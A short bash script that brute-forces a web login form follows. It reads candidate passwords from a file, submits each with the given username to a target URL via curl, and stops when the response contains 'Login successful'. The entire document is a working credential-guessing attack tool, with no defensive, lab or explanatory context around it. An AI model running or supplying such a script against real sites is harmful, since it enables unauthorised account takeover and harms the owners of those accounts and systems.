#!/bin/bash

# Set the variables as arguments
url=$1
username=$2

# Define a for loop to perform the brute force
for password in $(cat password_list.txt); do
  response=$(curl -s -d "username=$username&password=$password" $url)
  if [[ $response == *"Login successful"* ]]; then
    echo "Password found: $password"
    break
  fi
done



